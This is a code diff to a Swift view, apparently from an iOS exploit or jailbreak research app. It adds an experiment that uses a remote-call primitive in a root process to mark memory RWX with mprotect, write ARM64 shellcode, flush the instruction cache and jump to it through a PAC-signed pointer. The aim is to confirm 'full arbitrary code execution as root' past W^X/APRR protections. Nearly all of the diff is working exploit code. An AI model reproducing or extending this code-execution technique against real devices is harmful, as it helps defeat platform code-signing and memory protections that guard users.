@@ -282,6 +282,14 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp28)
             
             // ============================================
+            // Experiment 28b: SHELLCODE via mprotect'd trojanMem!
+            // mprotect SUCCESS confirmed — now try EXECUTE!
+            // ⚠️ MAY PANIC if APRR still blocks
+            // ============================================
+            let exp28b = self.expShellcodeViaMprotect(rc: rc)
+            experimentResults.append(exp28b)
+            
+            // ============================================
             // Experiment 29: ROP chain — call multiple functions in sequence
             // ============================================
             let exp29 = self.expROPChain(rc: rc)
@@ -1604,6 +1612,64 @@ struct AMFIExperimentView: View {
             detail: detail,
             timestamp: Date()
         )
+    }
+    
+    /// SHELLCODE EXECUTION via mprotect'd trojanMem!
+    /// trojanMem is already writable. mprotect(RWX) confirmed working.
+    /// Write shellcode → call it as function → if returns 42 = FULL CODE EXEC!
+    /// ⚠️ MAY CAUSE PANIC if APRR still blocks at hardware level
+    private func expShellcodeViaMprotect(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        
+        // Use a safe offset in trojanMem for shellcode (don't overwrite RC data)
+        let codeAddr = mem + 0xF00 // offset 0xF00 — safe area
+        
+        // Step 1: mprotect the page to RWX
+        let pageAddr = codeAddr & ~0x3FFF // align to 16KB page
+        let mprotRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // RWX
+        
+        guard mprotRet == 0 else {
+            return ExperimentResult(name: "shellcode (mprotect)", success: false, detail: "mprotect failed: \(mprotRet)", timestamp: Date())
+        }
+        
+        // Step 2: Write shellcode: mov x0, #42; ret
+        var shellcode: [UInt8] = [
+            0x40, 0x05, 0x80, 0xD2,  // mov x0, #42
+            0xC0, 0x03, 0x5F, 0xD6,  // ret
+        ]
+        rc.remote_write(codeAddr, from: &shellcode, size: UInt64(shellcode.count))
+        
+        // Step 3: Clear instruction cache (important for ARM!)
+        // sys_icache_invalidate equivalent
+        RootExecutor.rcall(rc, "sys_icache_invalidate", codeAddr, UInt64(shellcode.count))
+        
+        // Step 4: Call shellcode as function via RemoteCall
+        // RemoteCall will PAC-sign the pointer before jumping
+        var noArgs: [UInt64] = [0]
+        let result = "mprotect_shellcode".withCString { cName -> UInt64 in
+            UInt64(noArgs.withUnsafeMutableBufferPointer { buffer in
+                rc.doStable(
+                    withTimeout: 5,
+                    functionName: UnsafeMutablePointer(mutating: cName),
+                    functionPointer: UnsafeMutableRawPointer(bitPattern: UInt(codeAddr)),
+                    args: buffer.baseAddress,
+                    argCount: 0
+                )
+            })
+        }
+        
+        let success = result == 42
+        let detail = """
+        trojanMem: 0x\(String(format: "%llx", mem))
+        code addr: 0x\(String(format: "%llx", codeAddr))
+        mprotect(RWX): ✅
+        shellcode: mov x0, #42; ret
+        RESULT: \(result) \(success ? "🎉🎉🎉 SHELLCODE EXECUTED!!!" : "❌ (APRR may still block)")
+        
+        \(success ? "FULL ARBITRARY CODE EXECUTION ACHIEVED!\nWe can run ANY ARM64 code as root!" : "If 0 or crash → APRR hardware still enforces W^X\nIf non-42 → PAC or other issue")
+        """
+        
+        return ExperimentResult(name: "⚡ SHELLCODE (mprotect)", success: success, detail: detail, timestamp: Date())
     }
     
     /// ROP chain: call multiple functions in sequence without shellcode
